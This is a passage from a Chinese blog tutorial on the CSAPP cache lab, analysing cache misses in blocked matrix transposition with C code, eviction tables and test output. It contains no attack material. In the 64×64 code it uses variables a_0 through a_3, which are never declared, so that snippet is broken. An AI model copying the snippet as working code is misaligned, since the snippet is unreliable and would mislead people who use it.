(Simple row-wise scan transpose): hits:869, misses:1184, evictions:1152</span><br><span class="line"></span><br><span class="line">Summary <span class="keyword">for</span> official submission (func 0): correctness=1 misses=344</span><br><span class="line"></span><br><span class="line">TEST_TRANS_RESULTS=1:344</span><br></pre></td></tr></table></figure><p>Function 0对应上述代码，Function1对应题目给出的原始代码。二者的缓存不命中次数结果分别为344和1184。</p><ul><li><p>Function 0的理论分析：对于<code>A</code>中每一个操作块，只有每一行的第一个元素会不命中，所以为8次不命中；对于<code>B</code>中每一个操作块，只有每一列的第一个元素会不命中，所以也为 8 次不命中。总共<code>miss</code>次数为：8 × 16 × 2 = 256。</p></li><li><p>Function 1的理论分析：对于<code>A</code>，每8个<code>int</code>就会占满缓存的一组，所以每一行会有 32/8 = 4 次不命中；而对于<code>B</code>，考虑最坏情况，每一列都有 32 次不命中，由此，算出总不命中次数为 4 × 32 + 32 × 32 = 1152。</p></li></ul><p>可以观察到二者结果均比理论值要多一些，而理论上这个数应该小于等于理论分析结果。出现这一偏差的原因就在于：<strong>对角线上的缓冲块会冲突</strong>。</p><h3 id="使用局部变量缓解对角线冲突：原理">使用局部变量缓解对角线冲突：原理</h3><blockquote><p>困惑与感悟：</p><p>困惑：之前作者一直有个疑惑：为什么把内存读入到缓存中，不能直接写到其他内存？</p><p>感悟：<br>要搞清楚tag到底是什么，如下图：</p><p><img src="/2023/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l4-cachelab/image-20231003220409021.png" alt="image-20231003220409021"></p><p>tag是地址的第一部分，是内存地址的一部分，A和B两个矩阵这部分tag是不同的。</p><p>不存在直接从内存到内存的指令（这样会大大降低CPU时钟频率)，也不存在缓存到缓存到缓存的指令。因此读时是从内存到缓存再到CPU，而写时是从CPU到缓存再到内存，就算对于<code>A[0]=B[0]</code>这样的代码而言，也是不能把<code>B[0]</code>读入到缓存再把这块代码写给<code>A[0]</code>对应内存的——二者虽然index和offset都相同，但是tag不同，不能乱搞喔（电路上tag会不匹配）！</p></blockquote><p>在仅进行 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>8</mn><mo>×</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">8\times 8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">8</span></span></span></span>分块时，缓存替换情况如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">缓存中的内容 :</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">| opt                   |  cache            |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|before B[0][0]=tmp     | A[0]              |---+</span><br><span class="line">+-----------------------+-------------------+   |</span><br><span class="line">|after B[0][0]=tmp      | B[0]              |   |    </span><br><span class="line">+-----------------------+-------------------+   |    A 的第一行复制到 B 的第一列.</span><br><span class="line">|after tmp=A[0][1]      | A[0]              |   |    最终缓存中剩下 A[0], B[1]...B[7].</span><br><span class="line">+-----------------------+-------------------+   +--&gt; A[0]被两次加载进入内存, </span><br><span class="line">|after B[1][0]=tmp      | A[0] B[1]         |   |    总的 miss 次数是 10.               </span><br><span class="line">+-----------------------+-------------------+   |    </span><br><span class="line">|...                    |                   |   |    </span><br><span class="line">+-----------------------+-------------------+   |</span><br><span class="line">|after B[7][0]=tmp      | A[0] B[1..7]      |---+</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after B[0][1]=tmp      | A[1] B[0] B[2..7] |---+</span><br><span class="line">+-----------------------+-------------------+   |    A 的第二行复制到 B 的第二列.</span><br><span class="line">|after B[1][1]=tmp      | B[0..7]           |   |    其中发生的 miss 有 : </span><br><span class="line">+-----------------------+-------------------+   +--&gt; A[0], B[0], A[1]与 B[1]的相互取代. </span><br><span class="line">|after B[2][1]=tmp      | A[1] B[0] B[2..7] |   |    总的 miss 次数为 4.</span><br><span class="line">+-----------------------+-------------------+   |</span><br><span class="line">|...                    |                   |   |    </span><br><span class="line">+-----------------------+-------------------+   |</span><br><span class="line">|after B[7][1]=tmp      | A[1] B[0] B[2..]  |---+</span><br><span class="line">+-----------------------+-------------------+        之后的三至七行与第二行类似,</span><br><span class="line">|...                    |                   |------&gt; miss 的次数都是 4.</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after tmp=A[7][7]      | A[7] B[0..6]      |---+    最后一行 A[7] 被 A[8]取代后,</span><br><span class="line">+-----------------------+-------------------+   +--&gt; 不需要重新加载 .</span><br><span class="line">|after B[7][7]=tmp      | B[0..7]           |---+    总的 miss 数为 3. </span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line"></span><br><span class="line">所以对角块上的总的 miss 次数是 10+4*6+3=37.</span><br></pre></td></tr></table></figure><p>分析：</p><ul><li><p>第5行<code>tmp</code>在这里指的不是某个变量，而是未命名的缓存集（cache set），在 <code>before B[0][0]=tmp</code> 时需要把<code>A[0]</code>读入缓存赋给cache。</p></li><li><p>第7行<code>A[0]</code>被<code>B[0]</code>驱逐是因为二者映射到了同一位置，注意<strong>第7行<code>A[0]</code>被<code>B[0]</code>驱逐，随后第9行<code>B[0]</code>又被<code>A[0]</code>驱逐：<code>B[1][0]</code>需要使用<code>A[0][1]</code></strong> 。</p></li><li><p>第17行<strong>在<code>after B[0][1]=tmp</code>时<code>A[1]</code>会miss，在<code>after B[0][1]=tmp</code>时<code>B[0]</code>会miss，而后第19行<code>B[1]</code>会miss，而21行时<code>A[1]</code>会miss。</strong></p></li><li><p>对角分块有 4 个，普通的分块 12 个，所以总的 miss 数是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>×</mo><mn>37</mn><mo>+</mo><mn>12</mn><mo>×</mo><mn>8</mn><mo>×</mo><mn>2</mn><mo>=</mo><mn>340</mn></mrow><annotation encoding="application/x-tex">4\times 37+12\times 8\times 2=340</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">37</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">12</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">340</span></span></span></span>，和实际结果相差 4。4 是一个固定的偏差， 程序可能在这个过程中有 4 次额外的内存访问，在后面的根据算法定量分析结果和实际结果中都会有 4 次 miss 的偏差。</p></li></ul><p>使用局部变量的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i + <span class="number">8</span>; k++) &#123;</span><br><span class="line">            a0 = A[k][j];</span><br><span class="line">            a1 = A[k][j + <span class="number">1</span>];</span><br><span class="line">            a2 = A[k][j + <span class="number">2</span>];</span><br><span class="line">            a3 = A[k][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">            a5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">            a6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">            a7 = A[k][j + <span class="number">7</span>];</span><br><span class="line">            B[j][k] = a0;</span><br><span class="line">            B[j + <span class="number">1</span>][k] = a1;</span><br><span class="line">            B[j + <span class="number">2</span>][k] = a2;</span><br><span class="line">            B[j + <span class="number">3</span>][k] = a3;</span><br><span class="line">            B[j + <span class="number">4</span>][k] = a4;</span><br><span class="line">            B[j + <span class="number">5</span>][k] = a5;</span><br><span class="line">            B[j + <span class="number">6</span>][k] = a6;</span><br><span class="line">            B[j + <span class="number">7</span>][k] = a7;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：a0…a7一定要写在函数体内，不能写在函数外，否则缓存hit和miss的次数都会大大增加。<br>个人不是很理解：放在栈和放在堆上不都是放在内存，放在DRAM中吗？</p></blockquote><p>缓存替换情况如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">缓存中的内容 :</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">| opt                   |  cache            |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after tmp=A[0][0]      | A[0]              |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after tmp=A[0][1]      | A[0]              |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after tmp=A[0][2]      | A[0]              |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|...                    |                   |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after tmp=A[0][7]      | A[0]              |</span><br><span class="line">+-----------------------+-------------------|</span><br><span class="line">|after B[0][0]=tmp      | B[0]              | ---&gt; 缓存替换</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after B[1][0]=tmp      | B[0..1]           |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after B[2][0]=tmp      | B[0..2]           |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|...                    |                   |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after B[7][0]=tmp      | B[0..7]           |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after tmp=A[1][0]      | A[1] B[0] B[2..7] | ---&gt; 缓存替换</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|...                    |                   |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after tmp=A[1][7]      | A[1] B[0] B[2..7] |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after B[0][1]=tmp      | A[1] B[0] B[2..7] |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after B[1][1]=tmp      | B[0..7]           | ---&gt; 缓存替换（额外的）</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|after B[2][1]=tmp      | B[0..7]           |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line">|...                    |                   |</span><br><span class="line">+-----------------------+-------------------+</span><br><span class="line"></span><br><span class="line">额外的 miss 次数为 7 次（正常的形式: A[i][0], B[i][0], 额外的: B[1][1], B[2][2]...）</span><br><span class="line">对角块上的总的 miss 次数是 16 + 7 = 23次.</span><br></pre></td></tr></table></figure><ul><li><p>注意第17行，原始代码中<code>after B[1][0]=tmp</code>时<code>tmp</code>去需要去内存中读入<code>A[0]</code>，但由<strong>于<code>tmp</code>所对应的<code>A[0][1]</code>已经存放到CPU寄存器中</strong>，因此这里就不需要读取<code>A[0]</code>，自然也就不会驱逐<code>B[0]</code>。</p></li><li><p>对于对角线上的分块，复制 <code>A[m]</code> 时会取代 <code>B[m]</code>( 第一行除外 )，将数据写入 <code>B[m]</code> 的时候又会重新加载一次。 所以，额外的 miss 次数为 7 次。对角块总的 <code>miss</code> 次数为 23 次。总的 miss 次数应该为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>×</mo><mn>23</mn><mo>+</mo><mn>12</mn><mo>×</mo><mn>16</mn><mo>=</mo><mn>284</mn></mrow><annotation encoding="application/x-tex">4\times 23+12\times 16=284</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">23</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">12</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">16</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">284</span></span></span></span> 次。</p></li></ul><p>测试结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(cling) ➜  l4_cachelab ./test-trans -M 32 -N 32</span><br><span class="line"></span><br><span class="line">Function 0 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:1765, misses:288, evictions:256</span><br></pre></td></tr></table></figure><p>实测的miss次数为288，和理论分析相差 4 次。</p><h2 id="完美实现">完美实现</h2><p>前面提到的思路里 , 在对角线的分块处都无可避免的会产生 <code>A</code>, <code>B</code> 矩阵之间的缓存冲突。这个冲突真的不可避免吗？答案是否定的。实验要求上写了不能改变 <code>A</code> 矩阵，但是 <code>B</code> 可以随意处理。我们可以考虑在 <code>B</code> 矩阵上想点办法来消除两个矩阵之间的冲突。</p><p>为了消除对角线上分块行的相互替换，在实现中，每次先用局部变量缓存 <code>A</code> 分块的一行，再复制到 B 分块对应的行中。在复制完成后，<code>B</code> 的分块全部在缓存中，转置过程没有 miss。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="comment">// copy</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = i, s = j; k &lt; i + <span class="number">8</span>; ++k, ++s) &#123;</span><br><span class="line">            a0 = A[k][j];</span><br><span class="line">            a1 = A[k][j + <span class="number">1</span>];</span><br><span class="line">            a2 = A[k][j + <span class="number">2</span>];</span><br><span class="line">            a3 = A[k][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">            a5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">            a6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">            a7 = A[k][j + <span class="number">7</span>];</span><br><span class="line">            B[s][i] = a0;</span><br><span class="line">            B[s][i+<span class="number">1</span>] = a1;</span><br><span class="line">            B[s][i+<span class="number">2</span>] = a2;</span><br><span class="line">            B[s][i+<span class="number">3</span>] = a3;</span><br><span class="line">            B[s][i+<span class="number">4</span>] = a4;</span><br><span class="line">            B[s][i+<span class="number">5</span>] = a5;</span><br><span class="line">            B[s][i+<span class="number">6</span>] = a6;</span><br><span class="line">            B[s][i+<span class="number">7</span>] = a7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// transpose</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; ++k)</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> s = k + <span class="number">1</span>; s &lt; <span class="number">8</span>; ++s) &#123;</span><br><span class="line">                a0 = B[k + j][s + i];</span><br><span class="line">                B[k + j][s + i] = B[s + j][k + i];</span><br><span class="line">                B[s + j][k + i] = a0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码对应草稿图如下，编码时可以先画出草图，根据草图去写矩阵操作。</p><p><img src="/2023/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l4-cachelab/image-20231004143928333.png" alt></p><p>这个方法消除了所有的两个矩阵之间的缓存冲突，所以 miss 的理论次数是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn><mo>×</mo><mn>16</mn><mo>=</mo><mn>256</mn></mrow><annotation encoding="application/x-tex">16\times 16=256</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">16</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">16</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">256</span></span></span></span>。</p><p>实验测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(cling) ➜  l4_cachelab ./test-trans -M 32 -N 32</span><br><span class="line"></span><br><span class="line">Function 0 (2 total)</span><br><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line">Step 2: Evaluating performance (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:3585, misses:260, evictions:228</span><br></pre></td></tr></table></figure><p>比理论分析多4次，这应该是能够达到的最好结果了。</p><h2 id="64×64">64×64</h2><p>每 4 行就会占满一个缓存，先考虑 4 × 4 分块，结果miss为1891次，没能拿到满分。</p><p>下面提供两种写法，二者来自“参考资料“一章中两篇不同的博客，二者本质一样，只是写法上一种使用一个缓冲区，另一种使用两个缓冲区，后者缓存不命中次数更少。</p><h3 id="一个缓存区写法（简洁）">一个缓存区写法（简洁）</h3><p>考虑 8 × 8 分块，由于存在着每 4 行就会占满一个缓存的问题，在分块内部处理时就需要技巧了，我们把分块内部分成 4 个 4 × 4 的小分块分别处理：</p><ul><li>第一步，将<code>A</code>的左上和右上一次性复制给<code>B</code></li><li>第二步，用本地变量把<code>B</code>的右上角存储下来</li><li>第三步，将<code>A</code>的左下复制给<code>B</code>的右上</li><li>第四步，利用上述存储<code>B</code>的右上角的本地变量，把<code>A</code>的右上复制给<code>B</code>的左下</li><li>第五步，把<code>A</code>的右下复制给<code>B</code>的右下</li></ul><p>画出图解如下：</p><p><strong>这里的<code>A</code>和<code>B</code>均表示两个矩阵中的 8 × 8 块</strong></p><p><strong>第 1 步：</strong></p><p>把 A 矩阵中1号和2号复制给 B 矩阵。</p><p><img src="/2023/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l4-cachelab/image-20220321100111526-5c60655521283da99c49b487ef6310e5.png" alt></p><p>此时<code>B</code>的前 4 行就在缓存中了，接下来考虑利用这个缓存 。可以看到，为了利用<code>A</code>的缓存，第 2 块放置的位置实际上是错的，接下来就用本地变量保存<code>B</code>中 2 号块的内容。</p><p><strong>第 2 步：</strong></p><p>用本地变量把<code>B</code>的 2 号块存储下来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = j; k &lt; j + <span class="number">4</span>; k++)&#123;</span><br><span class="line">    a0 = B[k][i + <span class="number">4</span>];</span><br><span class="line">    a1 = B[k][i + <span class="number">5</span>];</span><br><span class="line">    a2 = B[k][i + <span class="number">6</span>];</span><br><span class="line">    a3 = B[k][i + <span class="number">7</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第 3 步：</strong></p><p>现在缓存中还是存着<code>B</code>中上两块的内容，所以将<code>A</code>的 3 号块内容复制给它。</p><p><img src="/2023/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l4-cachelab/image-20220321122954046-6e5d3d594a1502e46694eda30a8f586e.png" alt></p><p><strong>第 4/5 步：</strong></p><p>现在缓存已经利用到极致了，可以开辟<code>B</code>的下面两块了。</p><p><img src="/2023/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l4-cachelab/image-20220321123518762-af9c7a48faa494cb9e1ce6c16ad29b42.png" alt></p><p>这样就实现了转置，且消除了同一行中的冲突，具体代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j += <span class="number">8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i + <span class="number">4</span>; k++)&#123;</span><br><span class="line">            <span class="comment">// 得到A的第1,2块</span></span><br><span class="line">            a0 = A[k][j + <span class="number">0</span>];</span><br><span class="line">            a1 = A[k][j + <span class="number">1</span>];</span><br><span class="line">            a2 = A[k][j + <span class="number">2</span>];</span><br><span class="line">            a3 = A[k][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[k][j + <span class="number">4</span>];</span><br><span class="line">            a5 = A[k][j + <span class="number">5</span>];</span><br><span class="line">            a6 = A[k][j + <span class="number">6</span>];</span><br><span class="line">            a7 = A[k][j + <span class="number">7</span>];</span><br><span class="line">            <span class="comment">// 复制给B的第1,2块</span></span><br><span class="line">            B[j + <span class="number">0</span>][k] = a0;</span><br><span class="line">            B[j + <span class="number">1</span>][k] = a1;</span><br><span class="line">            B[j + <span class="number">2</span>][k] = a2;</span><br><span class="line">            B[j + <span class="number">3</span>][k] = a3;</span><br><span class="line">            B[j + <span class="number">0</span>][k + <span class="number">4</span>] = a4;</span><br><span class="line">            B[j + <span class="number">1</span>][k + <span class="number">4</span>] = a5;</span><br><span class="line">            B[j + <span class="number">2</span>][k + <span class="number">4</span>] = a6;</span><br><span class="line">            B[j + <span class="number">3</span>][k + <span class="number">4</span>] = a7;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = j; k &lt; j + <span class="number">4</span>; k++)&#123;</span><br><span class="line">            <span class="comment">// 得到B的第2块</span></span><br><span class="line">            a0 = B[k][i + <span class="number">4</span>];</span><br><span class="line">            a1 = B[k][i + <span class="number">5</span>];</span><br><span class="line">            a2 = B[k][i + <span class="number">6</span>];</span><br><span class="line">            a3 = B[k][i + <span class="number">7</span>];</span><br><span class="line">            <span class="comment">// 得到A的第3块</span></span><br><span class="line">            a4 = A[i + <span class="number">4</span>][k];</span><br><span class="line">            a5 = A[i + <span class="number">5</span>][k];</span><br><span class="line">            a6 = A[i + <span class="number">6</span>][k];</span><br><span class="line">            a7 = A[i + <span class="number">7</span>][k];</span><br><span class="line">            <span class="comment">// 复制给B的第2块</span></span><br><span class="line">            B[k][i + <span class="number">4</span>] = a4;</span><br><span class="line">            B[k][i + <span class="number">5</span>] = a5;</span><br><span class="line">            B[k][i + <span class="number">6</span>] = a6;</span><br><span class="line">            B[k][i + <span class="number">7</span>] = a7;</span><br><span class="line">            <span class="comment">// B原来的第2块移动到第3块</span></span><br><span class="line">            B[k + <span class="number">4</span>][i + <span class="number">0</span>] = a_0;</span><br><span class="line">            B[k + <span class="number">4</span>][i + <span class="number">1</span>] = a_1;</span><br><span class="line">            B[k + <span class="number">4</span>][i + <span class="number">2</span>] = a_2;</span><br><span class="line">            B[k + <span class="number">4</span>][i + <span class="number">3</span>] = a_3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = i + <span class="number">4</span>; k &lt; i + <span class="number">8</span>; k++)</span><br><span class="line">        